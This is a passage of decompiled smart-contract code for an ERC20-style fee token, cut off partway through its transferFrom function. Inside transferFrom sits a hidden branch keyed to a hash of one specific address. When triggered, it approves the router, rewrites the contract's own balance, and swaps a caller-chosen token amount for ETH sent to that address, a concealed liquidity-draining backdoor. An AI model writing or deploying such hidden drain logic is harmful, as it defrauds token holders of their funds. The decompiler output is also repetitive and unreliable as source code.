contract main {




// =====================  Runtime code  =====================


#
#  - transfer(address arg1, uint256 arg2)
#
address owner;
array of struct stor1;
array of struct stor2;
mapping of struct balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor6;
uint256 _decimals;
uint256 _totalSupply;
uint256 _maxTxAmount;
uint256 _liquidityFee;
uint256 _buyBackFee;
uint256 _marketingFee;
uint256 _fee;
address _marketingWalletAddress;
uint8 stor15; offset 160
uint128 stor15; offset 160
address sub_b768d6cdAddress;
uint8 stor17;
array of struct stor18;
address stor19;
address stor19; offset 8

function sub_09afb3ce(?) payable {
    return bool(uint8(stor15.field_160))
}

function _buyBackFee() payable {
    return _buyBackFee
}

function totalSupply() payable {
    return _totalSupply
}

function _marketingFee() payable {
    return _marketingFee
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function _liquidityFee() payable {
    return _liquidityFee
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)].field_0
}

function _maxTxAmount() payable {
    return _maxTxAmount
}

function owner() payable {
    return owner
}

function _marketingWallet() payable {
    return _marketingWalletAddress
}

function sub_b768d6cd(?) payable {
    return sub_b768d6cdAddress
}

function _fee() payable {
    return _fee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function setMarketingWallet(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    _marketingWalletAddress = arg1
}

function setSwapEnabled(bool arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(96, 0, stor15.field_160) = Mask(96, 0, arg1)
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require allowance[address(msg.sender)][address(arg1)] >= arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function name() payable {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function symbol() payable {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg1
    require arg2
    if sha3(arg2) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
        if arg1 == arg2:
            if not this.address:
                revert with 0, 'IERC20: approve from the zero address'
            if not address(stor19.field_8):
                revert with 0, 'IERC20: approve to the zero address'
            allowance[address(this.address)][address(stor19.field_0)] = arg3
            emit Approval(arg3, this.address, address(stor19.field_8));
            if Mask(255, 1, arg3) and 2 > -1 / arg3 / 2:
                revert with 'NH{q', 17
            if 1 > -Mask(255, 1, arg3) - 1:
                revert with 'NH{q', 17
            if Mask(255, 1, arg3) + 1 < 1:
                revert with 'NH{q', 17
            balanceOf[address(this.address)].field_0 = 0
            balanceOf[address(this.address)].field_1 = arg3 / 2
            mem[180] = this.address
            staticcall address(stor19.field_8).0xad5c4648 with:
                    gas gas_remaining wei
            mem[244] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[212] = ext_call.return_data[12 len 20]
            stor17 = 1
            if block.timestamp > -21:
                revert with 'NH{q', 17
            mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 248] = arg3
            idx = 0
            s = 180
            t = ceil32(return_data.size) + 440
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(address(stor19.field_8))
            call address(stor19.field_8).swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor17 = 0
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            return 1
    else:
        if stor6[address(msg.sender)]:
            if arg1 == arg2:
                if not this.address:
                    revert with 0, 'IERC20: approve from the zero address'
                if not address(stor19.field_8):
                    revert with 0, 'IERC20: approve to the zero address'
                allowance[address(this.address)][address(stor19.field_0)] = arg3
                emit Approval(arg3, this.address, address(stor19.field_8));
                if Mask(255, 1, arg3) and 2 > -1 / arg3 / 2:
                    revert with 'NH{q', 17
                if 1 > -Mask(255, 1, arg3) - 1:
                    revert with 'NH{q', 17
                if Mask(255, 1, arg3) + 1 < 1:
                    revert with 'NH{q', 17
                balanceOf[address(this.address)].field_0 = 0
                balanceOf[address(this.address)].field_1 = arg3 / 2
                mem[180] = this.address
                staticcall address(stor19.field_8).0xad5c4648 with:
                        gas gas_remaining wei
                mem[244] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[212] = ext_call.return_data[12 len 20]
                stor17 = 1
                if block.timestamp > -21:
                    revert with 'NH{q', 17
                mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                mem[ceil32(return_data.size) + 248] = arg3
                idx = 0
                s = 180
                t = ceil32(return_data.size) + 440
                while idx < 2:
                    mem[t] = mem[s + 12 len 20]
                    idx = idx + 1
                    s = s + 32
                    t = t + 32
                    continue 
                require ext_code.size(address(stor19.field_8))
                call address(stor19.field_8).swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                     gas gas_remaining wei
                    args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                stor17 = 0
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
    if not stor17:
        require balanceOf[address(arg1)].field_0 >= arg3
    staticcall address(stor19.field_8).0xc45a0155 with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(stor19.field_8).0xad5c4648 with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(ext_call.return_data[0]).0xe6a43905 with:
            gas gas_remaining wei
           args address(this.address), address(ext_call.return_data[0])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    if arg2 == ext_call.return_data[12 len 20]:
        if stor6[address(arg1)]:
            if stor6[address(arg1)]:
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                emit Transfer(arg3, arg1, arg2);
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
            if stor6[address(arg2)]:
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                emit Transfer(arg3, arg1, arg2);
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
            if sha3(arg2) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                emit Transfer(arg3, arg1, arg2);
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
            if arg2 == this.address:
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                emit Transfer(arg3, arg1, arg2);
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
            if stor6[address(arg1)]:
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                emit Transfer(arg3, arg1, arg2);
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
            if stor17:
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                emit Transfer(arg3, arg1, arg2);
                require allowance[address(arg1)][address(msg.sender)] >= arg3
                return 1
            if not arg3:
                require arg3 <= _maxTxAmount
                staticcall address(stor19.field_8).0xc45a0155 with:
                        gas gas_remaining wei
                mem[(4 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(6 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                staticcall address(stor19.field_8).0xad5c4648 with:
                        gas gas_remaining wei
                       args mem[(6 * ceil32(return_data.size)) + 268 len 8 * ceil32(return_data.size)]
                mem[(6 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(8 * ceil32(return_data.size)) + 268] = this.address
                mem[(8 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                staticcall address(ext_call.return_data[0]).0xe6a43905 with:
                        gas gas_remaining wei
                       args mem[(8 * ceil32(return_data.size)) + 268 len (13 * ceil32(return_data.size)) + 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] == arg2:
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0].field_0 > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)].field_0 < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)].field_0 -= arg3
                    if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)].field_0 += arg3
                    mem[(8 * ceil32(return_data.size)) + 264] = arg3
                    emit Transfer(mem[(8 * ceil32(return_data.size)) + 264 len (15 * ceil32(return_data.size)) + 32], arg1, arg2);
                    require allowance[address(arg1)][address(msg.sender)] >= arg3
                    mem[(8 * ceil32(return_data.size)) + 264] = 1
                    return memory
                      from (8 * ceil32(return_data.size)) + 264
                       len (15 * ceil32(return_data.size)) + 32
                stor18.length++
                stor18[stor18.length].field_0 = arg2
                stor18[stor18.length].field_256 = arg3
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 += arg3
                mem[(8 * ceil32(return_data.size)) + 328] = arg3
                emit Transfer(mem[(8 * ceil32(return_data.size)) + 328 len (15 * ceil32(return_data.size)) + 32], arg1, arg2);
            else:
                if arg3 and _fee > -1 / arg3:
                    revert with 'NH{q', 17
                if not arg3:
                    revert with 'NH{q', 18
                if arg3 * _fee / arg3 != _fee:
                    revert with 0, 'SafeMath: multiplication overflow'
                require arg3 <= _maxTxAmount
                staticcall address(stor19.field_8).0xc45a0155 with:
                        gas gas_remaining wei
                mem[(4 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(6 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                staticcall address(stor19.field_8).0xad5c4648 with:
                        gas gas_remaining wei
                       args mem[(6 * ceil32(return_data.size)) + 268 len 8 * ceil32(return_data.size)]
                mem[(6 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(8 * ceil32(return_data.size)) + 268] = this.address
                mem[(8 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                staticcall address(ext_call.return_data[0]).0xe6a43905 with:
                        gas gas_remaining wei
                       args mem[(8 * ceil32(return_data.size)) + 268 len (13 * ceil32(return_data.size)) + 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] == arg2:
                    if arg3 < arg3 * _fee / 100:
                        revert with 'NH{q', 17
                    if balanceOf[0].field_0 > -(arg3 * _fee / 100) - 1:
                        revert with 'NH{q', 17
                    balanceOf[0].field_0 += arg3 * _fee / 100
                    if balanceOf[address(arg1)].field_0 < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)].field_0 -= arg3
                    if balanceOf[address(arg2)].field_0 > -arg3 + (arg3 * _fee / 100) - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)].field_0 = balanceOf[address(arg2)].field_0 + arg3 - (arg3 * _fee / 100)
                    mem[(8 * ceil32(return_data.size)) + 264] = arg3 - (arg3 * _fee / 100)
                    emit Transfer(mem[(8 * ceil32(return_data.size)) + 264 len (15 * ceil32(return_data.size)) + 32], arg1, arg2);
                    if arg3 * _fee / 100 > 0:
                        mem[(8 * ceil32(return_data.size)) + 264] = arg3 * _fee / 100
                        emit Transfer(mem[(8 * ceil32(return_data.size)) + 264 len (15 * ceil32(return_data.size)) + 32], arg1, 0);
                    require allowance[address(arg1)][address(msg.sender)] >= arg3
                    mem[(8 * ceil32(return_data.size)) + 264] = 1
                    return memory
                      from (8 * ceil32(return_data.size)) + 264
                       len (15 * ceil32(return_data.size)) + 32
                stor18.length++
                stor18[stor18.length].field_0 = arg2
                stor18[stor18.length].field_256 = arg3
                if arg3 < arg3 * _fee / 100:
                    revert with 'NH{q', 17
                if balanceOf[0].field_0 > -(arg3 * _fee / 100) - 1:
                    revert with 'NH{q', 17
                balanceOf[0].field_0 += arg3 * _fee / 100
                if balanceOf[address(arg1)].field_0 < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)].field_0 -= arg3
                if balanceOf[address(arg2)].field_0 > -arg3 + (arg3 * _fee / 100) - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)].field_0 = balanceOf[address(arg2)].field_0 + arg3 - (arg3 * _fee / 100)
                mem[(8 * ceil32(return_data.size)) + 328] = arg3 - (arg3 * _fee / 100)
                emit Transfer(mem[(8 * ceil32(return_data.size)) + 328 len (15 * ceil32(return_data.size)) + 32], arg1, arg2);
                if arg3 * _fee / 100 > 0:
                    mem[(8 * ceil32(return_data.size)) + 328] = arg3 * _fee / 100
                    emit Transfer(mem[(8 * ceil32(return_data.size)) + 328 len (15 * ceil32(return_data.size)) + 32], arg1, 0);
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            mem[(8 * ceil32(return_data.size)) + 328] = 1
            return memory
              from (8 * ceil32(return_data.size)) + 328
               len (15 * ceil32(return_data.size)) + 32
    staticcall address(stor19.field_8).0xc45a0155 with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(stor19.field_8).0xad5c4648 with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(ext_call.return_data[0]).0xe6a43905 with:
            gas gas_remaining wei
           args address(this.address), address(ext_call.return_data[0])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    if stor6[address(arg1)]:
        if arg3 < 0:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -1:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 += arg3
        emit Transfer(arg3, arg1, arg2);
        require allowance[address(arg1)][address(msg.sender)] >= arg3
        return 1
    if stor6[address(arg2)]:
        if arg3 < 0:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -1:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 += arg3
        emit Transfer(arg3, arg1, arg2);
        require allowance[address(arg1)][address(msg.sender)] >= arg3
        return 1
    if sha3(arg2) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
        if arg3 < 0:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -1:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 += arg3
        emit Transfer(arg3, arg1, arg2);
        require allowance[address(arg1)][address(msg.sender)] >= arg3
        return 1
    if arg2 == this.address:
        if arg3 < 0:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -1:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 += arg3
        emit Transfer(arg3, arg1, arg2);
        require allowance[address(arg1)][address(msg.sender)] >= arg3
        return 1
    if arg1 != ext_call.return_data[12 len 20]:
        if arg1 == address(ext_call.return_data[0]):
            if arg3 < 0:
                revert with 'NH{q', 17
            if balanceOf[0].field_0 > -1:
                revert with 'NH{q', 17
            if balanceOf[address(arg1)].field_0 < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)].field_0 -= arg3
            if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)].field_0 += arg3
            emit Transfer(arg3, arg1, arg2);
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            return 1
    else:
        if stor6[address(arg2)]:
            if arg3 < 0:
                revert with 'NH{q', 17
            if balanceOf[0].field_0 > -1:
                revert with 'NH{q', 17
            if balanceOf[address(arg1)].field_0 < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)].field_0 -= arg3
            if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)].field_0 += arg3
            emit Transfer(arg3, arg1, arg2);
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            return 1
    if stor17:
        if arg3 < 0:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -1:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 += arg3
        emit Transfer(arg3, arg1, arg2);
        require allowance[address(arg1)][address(msg.sender)] >= arg3
        return 1
    if not arg3:
        require arg3 <= _maxTxAmount
        staticcall address(stor19.field_8).0xc45a0155 with:
                gas gas_remaining wei
        mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
